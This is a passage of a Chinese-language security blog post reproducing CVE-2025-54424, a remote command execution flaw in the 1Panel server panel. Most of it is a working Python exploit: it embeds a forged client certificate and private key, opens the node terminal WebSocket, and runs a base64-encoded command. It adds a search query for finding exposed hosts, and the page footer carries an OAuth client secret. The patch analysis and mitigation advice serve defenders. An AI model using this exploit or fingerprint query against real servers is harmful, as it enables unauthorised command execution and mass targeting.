+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ssl</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>websocket</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tempfile</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 你的证书和私钥内容（直接贴内容字符串）</span>
+</span></span><span class=line><span class=cl><span class=n>CERT_PEM</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;-----BEGIN CERTIFICATE-----
+</span></span></span><span class=line><span class=cl><span class=s2>MIICqjCCAZICCQDDd4Tgw3unbTANBgkqhkiG9w0BAQsFADAXMRUwEwYDVQQDDAxw
+</span></span></span><span class=line><span class=cl><span class=s2>YW5lbF9jbGllbnQwHhcNMjUwODA0MDgzMTIzWhcNMjYwODA0MDgzMTIzWjAXMRUw
+</span></span></span><span class=line><span class=cl><span class=s2>EwYDVQQDDAxwYW5lbF9jbGllbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+</span></span></span><span class=line><span class=cl><span class=s2>AoIBAQC0YnBiwFjb1UJCIviRuPJDhm+9vAbJ69Sk9f2IRn3iEMLg66a8U9f370ec
+</span></span></span><span class=line><span class=cl><span class=s2>V/BHyL/Wj+jqwks5p9L6rWPIaZoxynzoS4nj+hMHe2TKTIVgSjSwkEkTNUSzIhfM
+</span></span></span><span class=line><span class=cl><span class=s2>zxI6RzNI5B2bqO4WBD3+YQWCQffdBsJL7Qpz/qhps+/zIEOLlmp/dqh+Z9YOT91b
+</span></span></span><span class=line><span class=cl><span class=s2>PHThMeWLAcdZ439/yqIglNhGh0r4mRZpiSHoBQMSqSSR+YGbF1jsC5TKgLOwwUs5
+</span></span></span><span class=line><span class=cl><span class=s2>NrlmZ6nCGq8O5nAwFuCFebSMc9Uj4MHWHUbIuL0Qu86nJkDqsukEiU6Ao6wTVzTN
+</span></span></span><span class=line><span class=cl><span class=s2>Psue0X8Toy1UefjO1MHT+3USBkAnAgMBAAEwDQYJKoZIhvcNAQELBQADggEBADea
+</span></span></span><span class=line><span class=cl><span class=s2>/vNSMT0iFmke+woQIiocDwDp/X02jZzKlleLDazqBrE+SQx5XhgvCj8qvmL4Vtt0
+</span></span></span><span class=line><span class=cl><span class=s2>H75zljbFxBQM8PWq/4WKFbvbN3jsjfSAj80ko7rbJ63cbJYfCOxyvKJA0R8JTL1j
+</span></span></span><span class=line><span class=cl><span class=s2>Heaws1Uh5c5uCbOrp6Yej5iTYUuRLwGxQMlKfzKI/dUDVrjAM1twQl8uK2IYgOsA
+</span></span></span><span class=line><span class=cl><span class=s2>6mnt0Mfco/1S+Javkh2d029nBMdMd8jAs+85z8v8+BX1m5OomI12aJBIiaLAKQFx
+</span></span></span><span class=line><span class=cl><span class=s2>uqQhWtStAEHZDVJbLkXBNTUvzeF5zqJ30weRA++9mKDBs+WJh7Vq58V5lgksWX0w
+</span></span></span><span class=line><span class=cl><span class=s2>kBJIAEpeC+njBGXXltA=
+</span></span></span><span class=line><span class=cl><span class=s2>-----END CERTIFICATE-----&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>KEY_PEM</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;-----BEGIN PRIVATE KEY-----
+</span></span></span><span class=line><span class=cl><span class=s2>MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC0YnBiwFjb1UJC
+</span></span></span><span class=line><span class=cl><span class=s2>IviRuPJDhm+9vAbJ69Sk9f2IRn3iEMLg66a8U9f370ecV/BHyL/Wj+jqwks5p9L6
+</span></span></span><span class=line><span class=cl><span class=s2>rWPIaZoxynzoS4nj+hMHe2TKTIVgSjSwkEkTNUSzIhfMzxI6RzNI5B2bqO4WBD3+
+</span></span></span><span class=line><span class=cl><span class=s2>YQWCQffdBsJL7Qpz/qhps+/zIEOLlmp/dqh+Z9YOT91bPHThMeWLAcdZ439/yqIg
+</span></span></span><span class=line><span class=cl><span class=s2>lNhGh0r4mRZpiSHoBQMSqSSR+YGbF1jsC5TKgLOwwUs5NrlmZ6nCGq8O5nAwFuCF
+</span></span></span><span class=line><span class=cl><span class=s2>ebSMc9Uj4MHWHUbIuL0Qu86nJkDqsukEiU6Ao6wTVzTNPsue0X8Toy1UefjO1MHT
+</span></span></span><span class=line><span class=cl><span class=s2>+3USBkAnAgMBAAECggEAJKEIqUTdxmYbukpXp1+i8ktOTXzs8/vLhmPdQ9rsnQdC
+</span></span></span><span class=line><span class=cl><span class=s2>S2IOzZdI97PDGuBQjoMZUXyPk3w4wlBt6zFiXcPz58BydMlCCuUxEAfig6HeQ5tN
+</span></span></span><span class=line><span class=cl><span class=s2>77yc2iWq+aUmqBQ0Y1kp9Nc9m+pFznq2C/2vnK/AoUVKFxjfUoaXtD8xrnESxjlB
+</span></span></span><span class=line><span class=cl><span class=s2>yOy4Vv+EMXkCOyp72PE+09AHPsqHbHx4/0Io1yzje1ZKbVPHz+YhVxrN0+VsJAgF
+</span></span></span><span class=line><span class=cl><span class=s2>CgqBvXlJANo9erfzd1Po3vSFFogZaBRQWKdvO0/IojhcnPo5nF4v9J3LSXydHciO
+</span></span></span><span class=line><span class=cl><span class=s2>xkPlHw+iDBBtvdhAKoIeVH2iJemcKHX47REGdlfwwQKBgQDXNk25vfc4eUwuxTKc
+</span></span></span><span class=line><span class=cl><span class=s2>TVcLDR03tR2w9A2VuBPFbXiR8N+rBUMDhrvGHNK7/y7I0UHjB3fsqZyPeU4BBf5C
+</span></span></span><span class=line><span class=cl><span class=s2>rbsCIJ8vzMlK3bC+KTzpmaGdTt3z4BtWhFIZW6ypz8tgo9YOuWpnJSLjLoXw6yGK
+</span></span></span><span class=line><span class=cl><span class=s2>A9YDxVgMWHF8rYtya7SyTTd/PwKBgQDWkl1PBE8o1e8Q64MOJKWIwSpyRd0n5jqs
+</span></span></span><span class=line><span class=cl><span class=s2>Tr5SJh/Upka8WLCDaqLbSrTXjgkf3kxmFErK/EiV5ub42XlJkV3vXdHoJ3e2cF/4
+</span></span></span><span class=line><span class=cl><span class=s2>Z/AArlulIlKexGZNtPojnWcsFoeb01WSEEhQBjtvVZKsVRxLUxIWdMRsF70Jq9NT
+</span></span></span><span class=line><span class=cl><span class=s2>Mjj/G1NtGQKBgGjrEm1xDSs9B0Tt4kSM99htZkcYRwdTk6Pf/9OKEPOlKIWppQf9
+</span></span></span><span class=line><span class=cl><span class=s2>EWH9/0ajm11Plv1lULPR5H+Vtc+N6mz7YWYiHTkibyfOeDHczNNdkIquPkp8gRdm
+</span></span></span><span class=line><span class=cl><span class=s2>nte59605nn7YoKzA+/yZAC8dKTNQjiNIx3dDKC+slncf7BG2LHuYZWvlAoGABptn
+</span></span></span><span class=line><span class=cl><span class=s2>KCG31kgQHnNCC9NxDW71QaOJFctvDxM1pQ3reP7Nusr4VHOaJCp+uwxyl3qe253Q
+</span></span></span><span class=line><span class=cl><span class=s2>V8PA8Gy1u//mTi+dttsqtX1RoFqBegKpTzwPMlyGMsFVbRsfgK0+GgtvjYrKXb8G
+</span></span></span><span class=line><span class=cl><span class=s2>mwA2IE2AQLI2NtOOAQcDbVilx4B092DahHBw9zECgYBpreX1J3BkCDb7HHYItahK
+</span></span></span><span class=line><span class=cl><span class=s2>Wgn4ZSDgewps31IkrdU6Ns35nc6ITMuiQ1klsUXWkvno8oUHsbtK0th+LIpYRR0v
+</span></span></span><span class=line><span class=cl><span class=s2>PI+8Npci+kfgY9jbr+WrAApPk6wUHgxJvWLOuvz1ozLNsgb0O8J9e+pneO+zhcw6
+</span></span></span><span class=line><span class=cl><span class=s2>rOX2g1ftBZC9rgChkuYF0Q==
+</span></span></span><span class=line><span class=cl><span class=s2>-----END PRIVATE KEY-----&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>tempfile</span><span class=o>.</span><span class=n>NamedTemporaryFile</span><span class=p>(</span><span class=n>delete</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>suffix</span><span class=o>=</span><span class=s2>&#34;.crt&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>cert_temp</span><span class=p>,</span> \
+</span></span><span class=line><span class=cl>     <span class=n>tempfile</span><span class=o>.</span><span class=n>NamedTemporaryFile</span><span class=p>(</span><span class=n>delete</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>suffix</span><span class=o>=</span><span class=s2>&#34;.key&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>key_temp</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>cert_temp</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>CERT_PEM</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>cert_temp</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>key_temp</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>KEY_PEM</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>key_temp</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 创建 SSL 上下文并加载证书</span>
+</span></span><span class=line><span class=cl>    <span class=c1># context = ssl.create_default_context()</span>
+</span></span><span class=line><span class=cl>    <span class=c1># context.check_hostname = False</span>
+</span></span><span class=line><span class=cl>    <span class=c1># context.verify_mode = ssl.CERT_NONE</span>
+</span></span><span class=line><span class=cl>    <span class=c1># context.load_cert_chain(certfile=cert_temp.name, keyfile=key_temp.name)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 使用 websocket-client 连接</span>
+</span></span><span class=line><span class=cl>    <span class=n>ws</span> <span class=o>=</span> <span class=n>websocket</span><span class=o>.</span><span class=n>create_connection</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;wss://host:port/api/v2/hosts/terminal&#34;</span><span class=p>,</span>  <span class=c1># 替换目标</span>
+</span></span><span class=line><span class=cl>        <span class=n>sslopt</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;certfile&#34;</span><span class=p>:</span> <span class=n>cert_temp</span><span class=o>.</span><span class=n>name</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;keyfile&#34;</span><span class=p>:</span> <span class=n>key_temp</span><span class=o>.</span><span class=n>name</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cert_reqs&#34;</span><span class=p>:</span> <span class=n>ssl</span><span class=o>.</span><span class=n>CERT_NONE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] WebSocket connected&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 示例 payload：whoami</span>
+</span></span><span class=line><span class=cl>    <span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl>    <span class=n>cmd</span> <span class=o>=</span> <span class=s2>&#34;whoami</span><span class=se>\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;cmd&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>ws</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>ws</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Received:&#34;</span><span class=p>,</span> <span class=n>result</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>result</span><span class=p>)[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Error:&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=n>ws</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=指纹测绘>指纹测绘</h1><p>根据节点的证书指纹信息总结了一下，可以用下面的特征进行搜索。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>cert</span><span class=p>.</span><span class=nx>subject</span><span class=o>=</span><span class=s2>&#34;FIT2CLOUD&#34;</span> <span class=o>&amp;&amp;</span> <span class=nx>protocol</span><span class=o>=</span><span class=s2>&#34;tls&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>由于漏洞只影响专业版用户，且是v2版本，故影响量并没有想象中那么大。</p><p><img src=image-20250805144713804.png alt=image-20250805144713804></p><h1 id=漏洞修复>漏洞修复</h1><p>根据参考链接中的<a href=https://github.com/1Panel-dev/1Panel/pull/9698/commits/4003284521f8d31ddaf7215d1c30ab8b4cdb0261>pull</a>，把差异代码扣给<code>ChatGPT</code>，下面是它给出的分析。</p><blockquote><p>加强了对客户端 TLS 证书的验证，从简单地检查 Common Name（CN）为 <code>"panel_client"</code>，扩展为更通用且可插拔的证书验证逻辑，并在连接不合法时主动关闭连接。</p></blockquote><table><thead><tr><th>变更项目</th><th>修改内容</th><th>安全增强效果</th></tr></thead><tbody><tr><td><code>middleware.Certificate()</code></td><td>从硬编码 CN 校验 → 通用校验函数</td><td>提高灵活性，增强安全控制</td></tr><tr><td><code>CloseDirectly()</code></td><td>新增强制断开非法连接函数</td><td>避免响应输出，阻断通信</td></tr><tr><td><code>TLSConfig.ClientAuth</code></td><td>要求并验证客户端证书</td><td>防止伪造客户端接入</td></tr><tr><td>加载 RootCrt</td><td>设置可信 CA 根证书</td><td>确保客户端证书是可信签发的</td></tr></tbody></table><p>详细分析见<a href=https://chatgpt.com/s/t_6891c890fab481918b049e5c8a064d32>链接</a>。</p><p>总体来说，增加了证书的签发机构验证，保证是可信证书。</p><p>建议受影响的用户安装最新的节点来进行修复，也可以临时用防火墙/<code>IPtable</code>等限制访问可信IP访问。</p><h1 id=总结>总结</h1><p>这个漏洞还是挺有意思的，依赖证书进行身份验证的场景还是见的比较少。</p></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content>水泡泡-kking</span></p><p class=copyright-item><span class=item-title>上次更新</span>
+<span class=item-content>2025-08-05</span></p><p class=copyright-item><span class=item-title>许可协议</span>
+<span class=item-content><a rel="license noopener" href=https://creativecommons.org/licenses/by-nc-nd/4.0/ target=_blank>CC BY-NC-ND 4.0</a></span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/>漏洞复现</a></div><nav class=post-nav><a class=next href=/post/information_collect/><span class="next-text nav-default">浅谈信息收集</span>
+<span class="next-text nav-mobile">下一篇</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=gitalk-container></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js crossorigin=anonymous></script><script type=text/javascript>var gitalk=new Gitalk({id:"2025-08-05 14:15:21 +0800 +0800",title:"1Panel <= v2.0.5 远程命令执行（CVE-2025-54424）漏洞复现速记",clientID:"Ov23lip9t5W36uGJtB3O",clientSecret:"bba798312008a458f4f526de6b91dd76f210ae04",repo:"r00tuser111.github.io",owner:"r00tuser111",admin:["r00tuser111"],body:decodeURI(location.href)});gitalk.render("gitalk-container")</script><noscript>Please enable JavaScript to view the <a href=https://github.com/gitalk/gitalk>comments powered by gitalk.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:r00tuser@163.com class="iconfont icon-email" title=email></a><a href=https://x.com/_r00tuser class="iconfont icon-twitter" title=twitter></a><a href=https://github.com/r00tuser111 class="iconfont icon-github" title=github></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动
+</span><span class=division>|</span>
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a>
+</span><span class=copyright-year>&copy;
+2025<span class=heart><i class="iconfont icon-heart"></i></span><span>水泡泡-kking</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/timeago.js@3.0.2/dist/timeago.min.js integrity="sha256-jwCP0NAdCBloaIWTWHmW4i3snUNMHUNO+jr9rYd2iOI=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/timeago.js@3.0.2/dist/timeago.locales.min.js integrity="sha256-ZwofwC1Lf/faQCzN7nZtfijVV6hSwxjQMwXL4gn9qU8=" crossorigin=anonymous></script><script>var languageCode="zh-cn".replace(/-/g,"_").replace(/_(.*)/,function(e,t){return e.replace(t,t.toUpperCase())});timeago().render(document.querySelectorAll(".timeago"),languageCode),timeago.cancel()</script><script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script></body></html>
